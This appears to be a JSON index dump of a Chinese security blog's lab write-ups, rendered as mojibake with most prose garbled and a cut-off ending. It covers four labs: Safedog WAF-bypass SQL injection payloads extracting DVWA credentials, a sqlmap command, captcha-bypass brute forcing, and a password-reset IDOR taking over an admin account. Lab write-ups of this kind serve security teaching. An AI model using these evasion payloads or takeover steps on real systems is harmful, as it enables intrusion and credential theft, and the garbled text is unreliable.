WAFå’Œæœ‰WAFçš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨SQLMapè¿›è¡Œæ³¨å…¥ï¼Œæä¾›æ³¨å…¥ç»“æœæˆªå›¾\nï¼ˆ3ï¼‰åœ¨æœ‰WAFçš„æƒ…å†µä¸‹ï¼Œæ‰‹å·¥æ³¨å…¥å‡ºDVWAæ•°æ®åº“ä¸­çš„userå’Œpasswordï¼Œæä¾›æ³¨å…¥è¿‡ç¨‹è¯´æ˜æ–‡æ¡£\n1 å®éªŒç¯å¢ƒ è½¯ä»¶åç§° ç‰ˆæœ¬ éƒ¨ç½²æ–¹å¼ IP safedog å®˜ç½‘ä¸‹è½½å®‰è£…åŒ… 172.31.5.40 dvwa phpStudy2018éƒ¨ç½² 172.31.5.40 SQLMap kali è‡ªå¸¦ 172.31.5.9 2 å®‰è£…DVWA æ³¨æ„ï¼šè¿™é‡Œä½¿ç”¨phpStudy 2018è¿›è¡Œéƒ¨ç½²ï¼ˆå°½é‡ä¸è¦ç”¨æœ€æ–°ç‰ˆï¼Œé—®é¢˜è¾ƒå¤šï¼‰\nä¸‹è½½DVWAæºç ï¼Œé˜²æ­¢äºç½‘ç«™æ ¹ç›®å½•ä¸‹\nå°†DVWA\\config\\ç›®å½•ä¸‹çš„æ–‡ä»¶é‡å‘½åä¸ºconfig.inc.phpï¼Œå¹¶ä¿®æ”¹å…¶ä¸­çš„æ•°æ®åº“è´¦å·å’Œå¯†ç ä¸ºï¼šroot/rootï¼ˆæ ¹æ®å®é™…æƒ…å†µå¡«å†™ï¼‰\nä¿®æ”¹php.ini ä¸­çš„ä¸¤ä¸ªå‚æ•°ä¸ºOn\nä»¥ç³»ç»ŸæœåŠ¡çš„æ–¹å¼å¯åŠ¨apacheå’Œmysql\nè®¿é—® http://172.31.5.40/dvwa/ è¿›å…¥DVWAå®‰è£…ç•Œé¢\nç‚¹å‡»Create/Reset Databaseå®‰è£…æˆåŠŸåè¿›å…¥ç™»é™†ç•Œé¢ï¼ˆé»˜è®¤è´¦å·ï¼šadmin/passwordï¼‰\n3 å®‰è£…safedog å®˜ç½‘ä¸‹è½½æœ€æ–°ç‰ˆå®‰å…¨ç‹—Apacheç‰ˆæœ¬ http://free.safedog.cn/\nåŒå‡»å®‰è£…åŒ…è¿›è¡Œå®‰è£…ï¼Œå‡ºç°å¦‚ä¸‹ç•Œé¢è¯´æ˜å¯ä»¥æ­£å¸¸å®‰è£…ï¼Œå¦‚æœæœåŠ¡åä¸ºç©ºåˆ™ä¸æ­£å¸¸ï¼ˆæ²¡æœ‰ä»¥ç³»ç»ŸæœåŠ¡è¿è¡Œapacheï¼‰\n4 SQLMap æ³¨å…¥DVWAæ•°æ®åº“ å°†DVWAå®‰å…¨ç­‰çº§è®¾ç½®ä¸ºLow\n4.1 æœªå¼€å¯safedogæ—¶ æ‰“å¼€sqlæ³¨å…¥æ¨¡å—ï¼Œå¹¶è·å–URLä»¥åŠç™»é™†cookie\nä½¿ç”¨sqlmap å¯¹idå‚æ•°è¿›è¡Œæ³¨å…¥\nsqlmap --batch -u \u0026#34;http://172.31.5.40/dvwa/vulnerabilities/sqli/?id=1\u0026amp;Submit=Submit#\u0026#34; --cookie=\u0026#34;security=low; PHPSESSID=5oe9garl47s6buhb0rc7iav6g3\u0026#34; -p id æ³¨å…¥æˆåŠŸ\n4.2 å¼€å¯safedogæ—¶ å†æ¬¡æ‰§è¡Œæ³¨å…¥ï¼ˆæ³¨æ„è¦åˆ é™¤ä¸Šä¸€æ¬¡æ³¨å…¥çš„ç¼“å­˜æ–‡ä»¶ï¼‰ï¼Œæ³¨å…¥å¤±è´¥ã€‚æ£€æµ‹åˆ°äº†è¢«é˜²ç«å¢™æ‹¦æˆª\næ‰‹å·¥æ³¨å…¥ 1\u0026rsquo; and \u0026lsquo;1\u0026rsquo;=\u0026lsquo;1\næäº¤åè¢«å®‰å…¨ç‹—æ‹¦æˆª\n5 safedog ç»•è¿‡ 5.1 and å…³é”®å­—ç»•è¿‡ å†…è”æ³¨é‡Šï¼šæ˜¯MySQLä¸ºäº†ä¿æŒä¸å…¶ä»–æ•°æ®å…¼å®¹ï¼Œå°†MySQLä¸­ç‰¹æœ‰çš„è¯­å¥æ”¾åœ¨/!\u0026hellip;/ä¸­ï¼Œè¿™äº›è¯­å¥åœ¨ä¸å…¼å®¹ çš„æ•°æ®åº“ä¸­ä¸æ‰§è¡Œï¼Œè€Œåœ¨MySQLè‡ªèº«å´èƒ½è¯†åˆ«ã€‚\n/*!11445*/ è¡¨ç¤ºç‰ˆæœ¬å·ï¼›ä»00000~99999 ï¼Œéœ€è¦å°äºmysqlå½“å‰çš„ç‰ˆæœ¬ï¼› ä¾‹å¦‚ï¼šmysql 5.6 ï¼Œåˆ™ç‰ˆæœ¬å·éœ€è¦å°äº 56000 æ‰èƒ½æ‰§è¡ŒæˆåŠŸ\nè¿™ä¸ªç‰ˆæœ¬å·æœ‰å¾ˆå¤šå¯ä»¥å¤šå°è¯•å‡ ä¸ªï¼Œè¿™ä¸ªåŸç†å°±æ˜¯åœ¨mysqlæ•°æ®åº“å½“ä¸­/*ï¼åŠ ä¸ŠæŒ‡å®šçš„ç‰ˆæœ¬å·æ¥æ‰§è¡Œsql è¯­å¥ï¼š\n1\u0026#39;/*!11445and*/\u0026#39;1\u0026#39;=\u0026#39;1 #æˆåŠŸç»•è¿‡andå…³é”®å­—æ‹¦æˆª 5.2 order byå…³é”®å­—ç»•è¿‡ 1\u0026#39; order by 1 # æäº¤æ­¤å‚æ•°ä¼šè¢«æ‹¦æˆª\nä½¿ç”¨group by æ›¿æ¢\n1\u0026#39; group by 1 # æˆåŠŸç»•è¿‡order byå…³é”®å­—æ‹¦æˆª\nå¤šæ¬¡å°è¯•ï¼Œå½“ä½¿ç”¨å¦‚ä¸‹è¯­å¥åˆ™æŠ¥é”™ï¼Œå¯çŸ¥æ³¨å…¥çš„åˆ—æ•°ä¸º2\n1\u0026#39; group by 3 # 5.3 union å…³é”®å­—ç»•è¿‡ %0A è¡¨ç¤ºå›è½¦\n%23 è¡¨ç¤º #\nä¸ºé˜²æ­¢URLäºŒæ¬¡ç¼–ç ï¼Œä»¥ä¸‹å®éªŒä½¿ç”¨HackerBaræ’ä»¶è¿›å…¥æ³¨å…¥ç»•è¿‡ï¼ˆ%ä¼šè¢«äºŒæ¬¡ç¼–ç ï¼Œå¤±å»æœ¬æ¥çš„æ„ä¹‰ï¼‰\nä½¿ç”¨unionå…³é”®å­—ï¼Œè¢«æ‹¦æˆª\n1\u0026#39; union select 1,2 --+ ä½¿ç”¨ä»¥ä¸‹æ³¨å…¥æ³¨å…¥å‚æ•°\n1\u0026#39; regexp \u0026#34;%0A%23\u0026#34; /*!11144union %0A select */1,2 --+ æˆåŠŸç»•è¿‡unionå…³é”®å­—æ‹¦æˆª\n5.4 database å…³é”®å­—ç»•è¿‡ï¼ˆè·å–åº“åï¼‰ å°è¯•è·å–database()ï¼Œå‘ç°è¢«æ‹¦æˆª\n1\u0026#39; regexp \u0026#34;%0A%23\u0026#34; /*!11144union %0A select */database(),2--+ å†æ¬¡ä½¿ç”¨å…§è”æ³¨é‡Šç»•è¿‡database() æ‹¦æˆªï¼Œè·å–åˆ°æ•°æ®åº“åä¸ºdvwa\n?id=-1\u0026#39; regexp \u0026#34;%0A%23\u0026#34;/*!11144union %0A select*/ 1,database(%0A /*!11144*/)--+ 5.5 user() å…³é”®å­—ç»•è¿‡ï¼ˆè·å–ç”¨æˆ·åï¼‰ -1\u0026#39; regexp \u0026#34;%0A%23\u0026#34;/*!11144union %0A select*/ user(%0A /*!11144*/),database(%0A /*!11144*/)--+ 5.6 è·å–æ‰€æœ‰åº“å å°è¯•è·å–æ‰€æœ‰çš„åº“åï¼Œå‘ç°information_schema.schemataè¢«æ‹¦æˆª\nåˆ†åˆ«å¯¹schema_name å’Œinformation_schemaåŠ ä¸Šå†…è”æ³¨é‡Šè¿›è¡Œç»•è¿‡ï¼ˆä¸æ¸…æ¥šå…¶ä¸­å“ªä¸ªè¢«æ‹¦æˆªï¼Œç›´æ¥å…¨åŠ ä¸Šï¼‰\n5.7 è·å–æ‰€æœ‰è¡¨ è·å–dvwaåº“é‡Œé¢æ‰€æœ‰çš„è¡¨å\n-1\u0026#39; union /*!--+/*%0aselect/*!1,*/ group_concat(column_name) /*!from*/ /*!--+/*%0ainformation_schema./*!columns*/ where table_name=\u0026#39;users\u0026#39; --+ 5.8 æ³¨å…¥å‡ºè´¦å·å¯†ç  -1\u0026#39; union /*!--+/*%0aselect/*!1,*/ group_concat(concat_ws(0x7e,user,password)) /*!from*/ dvwa.users --+ åœ¨çº¿è§£å¯† https://www.cmd5.com/\nå¾—åˆ°adminç”¨æˆ·å¯†ç ä¸ºpassword\n","permalink":"https://senmer.github.io/zh/posts/tech/waf/safedog_bypass/","summary":"\u003cp\u003eï¼ˆ1ï¼‰å®ç°WAFå®‰è£…ä¸é…ç½®\u003c/p\u003e\n\u003cp\u003eï¼ˆ2ï¼‰åˆ†åˆ«åœ¨æ— WAFå’Œæœ‰WAFçš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨SQLMapè¿›è¡Œæ³¨å…¥ï¼Œæä¾›æ³¨å…¥ç»“æœæˆªå›¾\u003c/p\u003e\n\u003cp\u003eï¼ˆ3ï¼‰åœ¨æœ‰WAFçš„æƒ…å†µä¸‹ï¼Œæ‰‹å·¥æ³¨å…¥å‡ºDVWAæ•°æ®åº“ä¸­çš„userå’Œpasswordï¼Œæä¾›æ³¨å…¥è¿‡ç¨‹è¯´æ˜æ–‡æ¡£\u003c/p\u003e","title":"Safedog_bypass"},{"content":"ï¼ˆ1ï¼‰éªŒè¯ç ç»•è¿‡ï¼ˆon clientï¼‰+ éªŒè¯ç ç»•è¿‡ï¼ˆon serverï¼‰\nï¼ˆ2ï¼‰éªŒè¯ç ç»•è¿‡ï¼ˆon serverï¼‰å®éªŒä¸­ï¼Œä¸ºä»€ä¹ˆburpæ‹¦æˆªå¼€å¯çš„çŠ¶æ€ä¸‹ï¼Œé€šè¿‡Repeaterè¿›è¡Œé‡æ”¾ä¸ä¼šåˆ·æ–°éªŒè¯ç ï¼Œå…³é—­æ‹¦æˆªåæ‰ä¼šåˆ·æ–°éªŒè¯ç ï¼Ÿ\n1 å®éªŒç¯å¢ƒ è½¯ä»¶åç§° ç‰ˆæœ¬ éƒ¨ç½²æ–¹å¼ IP Pikachu latest docker run -d -p 8080:80 \u0026ndash;name pikachu area39/pikachu 172.31.5.7 2 éªŒè¯ç ä»‹ç»åŠåˆ†ç±» åœ¨å®‰å…¨é¢†åŸŸï¼ŒéªŒè¯ç ä¸»è¦åˆ†ä¸ºä¸¤å¤§ç±»ï¼šæ“ä½œéªŒè¯ç å’Œèº«ä»½éªŒè¯ç ã€‚\néªŒè¯ç çš„ä¸»è¦ä½œç”¨ï¼šé˜²æ­¢æ¶æ„æš´åŠ›ç ´è§£ã€æ¶æ„æ³¨å†Œã€åˆ·ç¥¨ã€è®ºå›çŒæ°´ç­‰ä¸€åˆ‡è„šæœ¬è¡Œä¸ºã€‚\néªŒè¯ç çš„åˆ†ç±»ï¼šæ‰‹æœºçŸ­ä¿¡ã€æ‰‹æœºè¯­éŸ³ã€é€šç”¨æ–‡å­—ã€åŠ å‡æ³•ã€éé€šç”¨æ–‡å­—ã€éé€šç”¨æ–‡å­—åŠ èƒŒæ™¯éšæœºåŠ æ‹‰ ä¼¸ã€æ— æ„ŸçŸ¥ã€æ»‘åŠ¨æ‹¼å›¾ã€æ–‡å­—ç‚¹é€‰ã€å›¾æ ‡ç‚¹é€‰ã€æ¨ç†æ‹¼å›¾ã€çŸ­ä¿¡ä¸Šè¡Œã€è¯­åºç‚¹é€‰ã€ç©ºé—´æ¨ç†ã€è¯­éŸ³éªŒè¯ ç­‰ç­‰ã€‚\n3 éªŒè¯ç ç»•è¿‡ï¼ˆon clientï¼‰ æ‰“å¼€pikachuçš„æš´åŠ›ç ´è§£æ¨¡å—\nå½“æœªè¾“å…¥éªŒè¯ç çš„æ—¶å€™ï¼Œæç¤ºâ€œè¯·è¾“å…¥éªŒè¯ç â€ï¼š\nå½“è¾“å…¥é”™è¯¯éªŒè¯ç çš„æ—¶å€™æç¤ºâ€œéªŒè¯ç è¾“å…¥é”™è¯¯â€ï¼š\nå½“è¾“å…¥æ­£ç¡®éªŒè¯ç ï¼ˆè´¦å·éšæ„è¾“å…¥ï¼‰çš„æ—¶å€™æç¤ºâ€œç”¨æˆ·åæˆ–è€…å¯†ç ä¸å­˜åœ¨â€ï¼š\nå¼€å¯burpæŠ“åŒ…ï¼Œå¤šæ¬¡ä¿®æ”¹å¯†ç ï¼Œä½¿ç”¨repeateræ¨¡å—å‘é€åï¼Œå‡è¿”å›çŠ¶æ€ç 200ï¼Œè¯´æ˜åŒä¸€éªŒè¯ç å¯ä½¿ç”¨å¤šæ¬¡\nä½¿ç”¨intruderæ¨¡å—å¯¹passwordè¿›è¡Œçˆ†ç ´ï¼ŒæˆåŠŸæ‹¿åˆ°å¯†ç \né€šè¿‡æµè§ˆå™¨æŸ¥çœ‹ï¼Œå¯çŸ¥è¯¥éªŒè¯ç ç”±å‰ç«¯ç”Ÿæˆï¼Œå› æ­¤è¿˜å¯é€šè¿‡ç¦ç”¨å‰ç«¯jsåŠŸèƒ½è¿›è¡Œç»•è¿‡\nç¦ç”¨jsä¹Ÿå¯ç»•è¿‡éªŒè¯ç ç™»å½•\n4 éªŒè¯ç ç»•è¿‡ï¼ˆon serverï¼‰ æˆªè·æ•°æ®åŒ…\nä½¿ç”¨repeateræ¨¡å—ï¼Œè¾“å…¥ä»»æ„éªŒè¯ç æç¤ºï¼šéªŒè¯ç é”™è¯¯\nåœ¨è¾“å…¥æ­£ç¡®çš„äºŒç»´ç çš„æƒ…å†µä¸‹ï¼Œå¹¶å¤šæ¬¡ä¿®æ”¹å¯†ç ï¼Œæç¤ºï¼šusername or password is not existsï½\nè¯´æ˜äºŒç»´ç æ˜¯å¯ä»¥é‡å¤å¤šæ¬¡ä½¿ç”¨çš„ï¼ˆå¯ä»¥æš´åŠ›ç ´è§£ï¼‰\nä½¿ç”¨æš´åŠ›ç ´è§£ï¼ŒæˆåŠŸç ´è§£å¯†ç \næŸ¥çœ‹æºç \ndocker exec pikachu bash -c \u0026#39;cat /app/vul/burteforce/bf_server.php\u0026#39; å¯ä»¥å‘ç°ï¼Œåç«¯åœ¨ä½¿ç”¨éªŒè¯ç åï¼Œæœªè¿›è¡Œé”€æ¯\n","permalink":"https://senmer.github.io/zh/posts/tech/brute_force/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87/","summary":"\u003cp\u003eï¼ˆ1ï¼‰éªŒè¯ç ç»•è¿‡ï¼ˆon clientï¼‰+ éªŒè¯ç ç»•è¿‡ï¼ˆon serverï¼‰\u003c/p\u003e\n\u003cp\u003eï¼ˆ2ï¼‰éªŒè¯ç ç»•è¿‡ï¼ˆon serverï¼‰å®éªŒä¸­ï¼Œä¸ºä»€ä¹ˆburpæ‹¦æˆªå¼€å¯çš„çŠ¶æ€ä¸‹ï¼Œé€šè¿‡Repeaterè¿›è¡Œé‡æ”¾ä¸ä¼šåˆ·æ–°éªŒè¯ç ï¼Œå…³é—­æ‹¦æˆªåæ‰ä¼šåˆ·æ–°éªŒè¯ç ï¼Ÿ\u003c/p\u003e","title":"éªŒè¯ç ç»•è¿‡"},{"content":"ï¼ˆ1ï¼‰å¯†ç ä¿®æ”¹é€»è¾‘æ¼æ´\n1 å®éªŒç¯å¢ƒ è½¯ä»¶åç§° ç‰ˆæœ¬ éƒ¨ç½²æ–¹å¼ IP webug latest docker run -d -p 8082:80 -p 33060:3306 \u0026ndash;name webug area39/webug 172.31.5.7 2 é€»è¾‘æ¼æ´æ¦‚è¿° ç”±äºç¨‹åºé€»è¾‘è¾“å…¥ç®¡æ§ä¸ä¸¥ï¼Œå¯¼è‡´ç¨‹åºä¸èƒ½å¤Ÿæ­£å¸¸å¤„ç†æˆ–å¤„ç†é”™è¯¯ã€‚ä¸€èˆ¬å‡ºç°åœ¨ç™»å½•æ³¨å†Œã€å¯†ç æ‰¾å›ã€ä¿¡æ¯æŸ¥çœ‹ã€äº¤æ˜“æ”¯ä»˜é‡‘é¢ç­‰ä½ç½®ï¼Œç”±äºé€»è¾‘æ¼æ´äº§ç”Ÿçš„æµé‡å¤šæ•°ä¸ºåˆæ³•æµé‡ï¼Œä¸€èˆ¬çš„é˜²æŠ¤æ‰‹æ®µæˆ–è®¾å¤‡æ— æ³•é˜»æ­¢ï¼Œä¹Ÿå¯¼è‡´äº†é€»è¾‘æ¼æ´æˆä¸ºäº†ä¼ä¸šé˜²æŠ¤ä¸­çš„éš¾é¢˜ ã€‚\n3 å¦‚ä½•æŒ–æ˜é€»è¾‘æ¼æ´ 3.1 æ³¨å†Œç‚¹ æ³¨å†ŒåŠŸèƒ½å¯èƒ½å‡ºç°ä»»æ„ç”¨æˆ·æ³¨å†Œã€çŸ­ä¿¡è½°ç‚¸ç­‰é—®é¢˜ å‰ç«¯éªŒè¯ï¼šåˆ¤æ–­æ˜¯å¦æœ‰ä»»æ„ç”¨æˆ·æ³¨å†Œ æ‰‹æœºéªŒè¯ç éªŒè¯ï¼šéªŒè¯ç æ˜¯å¦å¯ä»¥æš´åŠ›ç ´è§£ï¼ŒéªŒè¯ç ä¸å½“å‰æ‰‹æœºå·æ²¡æœ‰æ£€éªŒåŒ¹é… ç”¨æˆ·åå¯†ç æ³¨å†Œï¼šæ˜¯å¦ä¼šå¯¼è‡´æ‰¹é‡æ³¨å†Œ 3.2 ç™»é™†ç‚¹ å¯èƒ½å‡ºç°ä»»æ„ç”¨æˆ·ç™»é™†ã€çŸ­ä¿¡è½°ç‚¸ç­‰é—®é¢˜ å‰ç«¯éªŒè¯ï¼šåˆ¤æ–­æ˜¯å¦æœ‰ä»»æ„ç”¨æˆ·ç™»é™†ï¼Œæ˜¯å¦æœ‰éªŒè¯ç å›æ˜¾ï¼Œæ˜¯å¦å¯ä»¥ä¿®æ”¹è¿”å›åŒ…é€ æˆä»»æ„ç”¨æˆ·ç™»å½•é—®é¢˜ æ‰‹æœºéªŒè¯ç éªŒè¯ï¼šæ˜¯å¦å¯ä»¥çˆ†ç ´éªŒè¯ç ï¼ŒéªŒè¯ç ä¸å½“å‰æ‰‹æœºå·æœ‰æ²¡æœ‰æ£€éªŒåŒ¹é… è´¦å·å¯†ç ç™»å½•ï¼šæ²¡æœ‰éªŒè¯ç æˆ–è€…æ˜¯å¦å­˜åœ¨éªŒè¯ç å¯ä»¥ç»•è¿‡ï¼ˆå¯ä»¥æš´åŠ›ç ´è§£ï¼‰ 3.3 å¯†ç æ‰¾å›ç‚¹ éªŒè¯ç æ˜¯å¦å¯ä»¥å¤šæ¬¡ä½¿ç”¨ éªŒè¯ç æ˜¯å¦ç›´æ¥è¿”å›åœ¨æ•°æ®åŒ…ä¸­ éªŒè¯ç æœªç»‘å®šç”¨æˆ· ä¿®æ”¹æ¥å—çš„æ‰‹æœºæˆ–è€…é‚®ç®±è¿›è¡Œå¯†ç é‡ç½® å‰ç«¯éªŒè¯ç»•è¿‡ éªŒè¯æ­¥éª¤ç»•è¿‡ï¼ˆå…ˆè·å–æ‰‹æœºéªŒè¯ç ï¼Œå†è¾“å…¥è¦ä¿®æ”¹çš„é‚®ç®±å’Œå¯†ç ï¼‰ æœªæ ¡éªŒç”¨æˆ·å­—æ®µçš„å€¼ ä¿®æ”¹å¯†ç å¤„idå¯è¢«æ›¿æ¢ ã€‚ã€‚ã€‚\n4 å¯†ç ä¿®æ”¹é€»è¾‘æ¼æ´ æ‰“å¼€webugé€»è¾‘æ¼æ´æ¨¡å—ï¼ˆé»˜è®¤è´¦å·ï¼šadmin/admin, æ•°æ®åº“è´¦å·root/toorï¼‰\nåå°é¡µé¢\nè¿›å…¥å®¹å™¨æŸ¥çœ‹ç½‘ç«™åå°ç®¡ç†ç³»ç»Ÿçš„è´¦å·å¯†ç ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªè´¦å·\n[root@centos7 ~]# docker exec webug bash -c \u0026#39;mysql -uroot -ptoor -e \u0026#34;use webug;select * from user_test\\G\u0026#34;\u0026#39; *************************** 1. row *************************** id: 1 username: admin password: admin *************************** 2. row *************************** id: 2 username: aaaaa password: asdfsadf 4.1 ä¿®æ”¹å¯†ç æœªæ ¡éªŒæ—§å¯†ç  ä½¿ç”¨è´¦å·aaaaa/asdfsadf ç™»å½•ï¼Œå‘ç°404æŠ¥é”™ï¼Œè¿™æ˜¯ç”±äºwebugè‡ªèº«çš„bugå¼•èµ·çš„\nåˆ é™¤URLä¸­çš„pt_envåæ­£å¸¸è®¿é—®ï¼Œæ˜¯ä¸€ä¸ªå¯ä»¥ä¿®æ”¹å¯†ç çš„é¡µé¢\nè¾“å…¥ä»»æ„å¯†ç åæäº¤\nå‘ç°å¯ä»¥æ­£å¸¸æäº¤ï¼ˆæœªå¯¹æ—§å¯†ç åšéªŒè¯ï¼‰\nå†æ¬¡æŸ¥çœ‹åå°æ•°æ®åº“è´¦å·å¯†ç ï¼Œå‘ç°å¯†ç ä¿®æ”¹æˆåŠŸ\n[root@centos7 ~]# docker exec webug bash -c \u0026#39;mysql -uroot -ptoor -e \u0026#34;use webug;select * from user_test\\G\u0026#34;\u0026#39; *************************** 1. row *************************** id: 1 username: admin password: admin *************************** 2. row *************************** id: 2 username: aaaaa password: 123 #å¯†ç å·²è¢«ä¿®æ”¹ 4.2 æ™®é€šç”¨æˆ·ä¿®æ”¹ç®¡ç†å‘˜è´¦å·å¯†ç  ä½¿ç”¨burpæŠ“åŒ…ï¼Œä½¿ç”¨è´¦å·aaaaa/123ç™»å½•åå°ï¼Œå†æ¬¡æäº¤ä¿®æ”¹å¯†ç çš„è¯·æ±‚ã€‚\nå‘ç°å…¶ä¸­æœ‰ä¸ªå­—æ®µid=2ï¼ˆé€šå¸¸0æˆ–è€…1æ˜¯ç®¡ç†å‘˜çš„æ ‡è¯†ï¼‰\nå°†å­—æ®µå€¼æ”¹ä¸º1åï¼Œæ”¾è¡Œæ•°æ®åŒ…ã€‚è¿”å›çŠ¶æ€ç 200\næŸ¥çœ‹åå°æ•°æ®åº“ä¿¡æ¯ï¼Œå‘ç°ç®¡ç†å‘˜è´¦å·å¯†ç å·²è¢«ä¿®æ”¹\n[root@centos7 ~]# docker exec webug bash -c \u0026#39;mysql -uroot -ptoor -e \u0026#34;use webug;select * from user_test\\G\u0026#34;\u0026#39; *************************** 1. row *************************** id: 1 username: admin password: test *************************** 2. row *************************** id: 2 username: aaaaa password: test ","permalink":"https://senmer.github.io/zh/posts/tech/logic/%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/","summary":"\u003cp\u003eï¼ˆ1ï¼‰å¯†ç ä¿®æ”¹é€»è¾‘æ¼æ´\u003c/p\u003e","title":"å¯†ç ä¿®æ”¹é€»è¾‘æ¼æ´"},{"content":"ï¼ˆ1ï¼‰bluecmsæ—æ³¨æ¼æ´ç»ƒä¹ \nï¼ˆ2ï¼‰ä¸ºä»€ä¹ˆæ—ç«™æ”»å‡»å¯ä»¥æ‹¿ä¸‹ä¸»ç«™ï¼Ÿ\nï¼ˆ3ï¼‰è·¨åº“çš„æ„æ€æ˜¯ä»€ä¹ˆï¼Ÿ\n1 å®éªŒç¯å¢ƒ è½¯ä»¶åç§° ç‰ˆæœ¬ éƒ¨ç½²æ–¹å¼ IP bluecms v1.6 sp1 phpStudyæºç éƒ¨ç½² 172.31.5.1 å°†bluecmsæºç æ”¾å…¥phpstudyç½‘ç«™ç›®å½•ä¸­\nè®¿é—®å®‰è£…é“¾æ¥è¿›è¡Œå®‰è£…\nhttp://172.31.5.1/bluecms/uploads/install/ ç‚¹å‡»ä¸‹ä¸€æ­¥ï¼Œè¿”å›ç©ºç™½é¡µé¢ã€‚è¯´æ˜å®‰è£…æˆåŠŸ\n2 æ—æ³¨ç®€ä»‹ 2.1 åŸç† åœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œå¦‚æœæ­£é¢éš¾ä»¥çªç ´ï¼Œé‚£ä¹ˆå°±é‡‡ç”¨ä¸€äº›è¿‚å›æˆ˜æœ¯ï¼Œä»ä¾§é¢æ¥è¿›è¡Œã€‚ä¹Ÿå°±æ˜¯é‡‡ç”¨ä¸€äº›é—´æ¥çš„æ–¹æ³•ï¼Œä¾‹å¦‚æ—æ³¨ï¼Œé€šè¿‡æ—ç«™æ¥è¿›è¡Œæ¸—é€ã€‚\n**ä»€ä¹ˆæ˜¯æ—æ³¨ï¼Ÿ**åœ¨åŒä¸€æœåŠ¡å™¨ä¸Šæœ‰å¤šä¸ªç«™ç‚¹ï¼Œæˆ‘ä»¬è¦æ”»å‡»çš„è¿™ä¸ªç«™ç‚¹å‡è®¾æ²¡æœ‰æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥æ”»å‡»æœåŠ¡å™¨ä¸Šçš„ä»»æ„ä¸€ä¸ªç«™ç‚¹ï¼Œè¿™ä¸ªå°±æ˜¯æ—æ³¨ã€‚ï¼ˆå‡è®¾Aç½‘ç«™å’ŒBç½‘ç«™åœ¨åŒä¸€ä¸ªæœåŠ¡å™¨ä¸Šï¼Œæ”»å‡»Aç½‘ç«™ï¼Œä½†æ˜¯Aç½‘ç«™æ²¡æœ‰æ¼æ´ï¼ŒBç½‘ç«™æœ‰æ¼æ´ï¼Œè¿™æ—¶å¯ä»¥é€šè¿‡æ”»å‡»Bç½‘ç«™æ‰¾åˆ°æœåŠ¡å™¨ï¼‰\nä»€ä¹ˆæ˜¯è·¨åº“ï¼Ÿè·¨åº“æŸ¥è¯¢æ˜¯æŒ‡ç”±äºæƒé™è®¾ç½®ä¸ä¸¥æ ¼ï¼Œå¯¼è‡´æ™®é€šå¸å·è¢«æˆäºˆè¿‡é«˜çš„æƒé™ï¼Œä»è€Œä½¿å¾—å…¶å¯ä»¥å¯¹å…¶ä»–çš„æ•°æ®åº“è¿›è¡Œæ“ä½œã€‚æ¯”å¦‚ï¼Œåœ¨mysqlä¸­ï¼Œinformatin_schema è¿™ä¸ªè¡¨é»˜è®¤åªæœ‰rootæœ‰æƒé™è¿›è¡Œæ“ä½œã€‚ä½†æ˜¯å¦‚æœä¸€ä¸ªæ™®é€šè´¦æˆ·æƒé™è¿‡é«˜åï¼Œä»–ä¾¿å¯ä»¥å¯¹è¯¥æ•°æ®åº“è¿›è¡Œæ“ä½œï¼Œä»è€Œæ‹¿åˆ°æ•´ä¸ªæ•°æ®åº“çš„ä¿¡æ¯ã€‚\n2.2 ç¤ºä¾‹ å‡å¦‚åœ¨æŸæ¬¡æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­æˆ‘ä»¬å‘ç°ä¸»ç«™éš¾ä»¥æ”»ç ´ï¼Œé€šè¿‡å­åŸŸåå‘ç°å­˜åœ¨æ—ç«™bluecmsï¼Œäºæ˜¯é€šè¿‡æ—ç«™æ¥è¿›è¡Œæ”»å‡»ï¼š\n2.2.1 å‘ç°ç®¡ç†é¡µ æ‰“å¼€bluecmsä¸»é¡µ ï¼Œå°è¯•ç™»å½•adminè´¦å·ï¼Œå¯†ç ä»»æ„è¾“å…¥ã€‚\nhttp://172.31.5.1/bluecms/uploads/ ç‚¹å‡»ç™»å½•ï¼Œå‘ç°æç¤ºï¼š\nçŒœæµ‹è¯¥ç½‘ç«™æœ‰åå°ç®¡ç†é¡µé¢ï¼Œé€šè¿‡ç«™ç‚¹æ‰«ææˆåŠŸæ‰¾åˆ°åå°ç™»å½•é¡µé¢\nhttp://172.31.5.1/bluecms/uploads/admin/login.php?act=login 2.2.2 çˆ†ç ´ç®¡ç†å‘˜å¯†ç  ä½¿ç”¨adminè´¦å·å°è¯•å¤šæ¬¡å¯†ç ï¼Œè´¦å·æœªè¢«é”å®šï¼Œä¸”æ²¡æœ‰éªŒè¯ç åŠŸèƒ½ã€‚é€šè¿‡çˆ†ç ´è·å¾—å¯†ç admin\nä½¿ç”¨è´¦å·admin/adminæˆåŠŸç™»å½•åå°\n2.2.3 å‘ç°æ³¨å…¥ç‚¹ æµè§ˆåå°ï¼Œå‘ç°ä¸€ä¸ªåŠŸèƒ½ï¼šè·å–js\nç‚¹å‡»è·å–jsï¼Œå¾—åˆ°ä¸€ä¸ªé“¾æ¥\nhttp://172.31.5.1/bluecms/uploads/ad_js.php?ad_id=1 2.2.4 sqlæ³¨å…¥æ‹¿åˆ°è´¦å· ä¿®æ”¹idå€¼ä¸º-1 order by 1ï¼Œå‘ç°æˆåŠŸæ‰§è¡Œã€‚å¯èƒ½æ˜¯ä¸€ä¸ªæ³¨å…¥ç‚¹\nç›´æ¥ä½¿ç”¨order by è¿›è¡Œæ³¨å…¥ï¼Œå¤šæ¬¡å°è¯•åï¼Œå¾—åˆ°åˆ—æ•°ä¸º7ï¼ˆ 8æŠ¥é”™ï¼‰ ä½¿ç”¨unionå…³é”®å­—æ³¨å…¥ï¼ˆæ³¨æ„è¿™é‡Œå¯èƒ½ç”±äºç¯å¢ƒåŸå› å¯¼è‡´æ²¡æœ‰å›æ˜¾ï¼Œä½¿ç”¨ç«ç‹æµè§ˆå™¨ï¼Œç‚¹å‡»ç®­å¤´æ‰€æŒ‡å¤„å¯è·å¾—ç»“æœï¼‰\næ‰©å±•é“¾æ¥ï¼šæ€ªå¼‚æ¨¡å¼å’Œæ 